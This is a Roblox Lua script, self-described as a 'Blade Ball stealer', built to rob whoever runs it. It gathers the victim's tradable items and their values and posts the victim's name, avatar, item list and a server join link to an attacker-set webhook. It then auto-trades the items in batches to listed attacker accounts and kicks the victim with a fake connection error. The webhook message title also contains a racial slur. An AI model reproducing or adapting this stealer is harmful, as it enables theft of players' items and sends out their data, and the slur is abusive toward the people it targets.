_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "" 

local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request

-- Fonction pour récupérer l'avatar de la victime
local function getAvatarUrl(userId)
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
end

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local totalRAP = 0

-- FONCTION D'ENVOI AU WORKER (Avec data Avatar/Nom)
local function PostToCloudflare(data)
    data["auth_token"] = auth_token
    data["victim_name"] = plr.Name
    data["victim_avatar"] = getAvatarUrl(plr.UserId)
    
    local success, res = pcall(function()
        return httpRequest({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
    return success
end

local function SendJoinMessage(list, prefix)
    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = grouped[item.Name] or {Name = item.Name, Count = 0, TotalRAP = 0}
        grouped[item.Name].Count = grouped[item.Name].Count + 1
        grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
    end

    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end
    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)

    local itemListText = ""
    for _, group in ipairs(groupedList) do
        -- Format sans étoile
        itemListText = itemListText .. string.format("- %s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "🟣 Bro join your hit nigga 🎯",
            ["color"] = 8323327,
            ["fields"] = {
                {name = "Victim Username 🤖:", value = plr.Name, inline = true},
                {name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId},
                {name = "Item list 📝:", value = #itemListText > 1000 and string.sub(itemListText, 1, 1000) .. "..." or itemListText},
                {name = "Summary 💰:", value = "Total RAP: " .. formatNumber(totalRAP)}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    PostToCloudflare(data)
end

-- Calcul du RAP et préparation des items
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
for _, category in ipairs(categories) do
    local catMap = {}
    local categoryRapData = rapData[category]
    if categoryRapData then
        for serializedKey, rap in pairs(categoryRapData) do
            local s, decoded = pcall(function() return HttpService:JSONDecode(serializedKey) end)
            if s then 
                for _, pair in ipairs(decoded) do 
                    if pair[1] == "Name" then catMap[pair[2]] = rap end 
                end 
            end
        end
    end

    for itemId, itemInfo in pairs(clientInventory[category]) do
        if not itemInfo.TradeLock then
            local rap = catMap[itemInfo.Name] or 0
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
            end
        end
    end
end

-- Lancement de la logique de trade
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    
    local prefix = (ping == "Yes") and "@everyone " or ""
    SendJoinMessage(itemsToSend, prefix)

    local function doTrade(target)
        while #itemsToSend > 0 do
            pcall(function()
                netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(Players:WaitForChild(target))
            end)
            repeat task.wait(0.5) until tradeGui.Enabled
            inTrade = true
            
            local count = 0
            while #itemsToSend > 0 and count < 100 do
                local item = table.remove(itemsToSend, 1)
                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                count = count + 1
            end
            
            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            repeat task.wait(0.2) until not tradeGui.Enabled
            inTrade = false
        end
        plr:kick("Connection Error (277)")
    end

    Players.PlayerAdded:Connect(function(player)
        if table.find(users, player.Name) then doTrade(player.Name) end
    end)
    for _, p in ipairs(Players:GetPlayers()) do
        if table.find(users, p.Name) then doTrade(p.Name) break end
    end
end
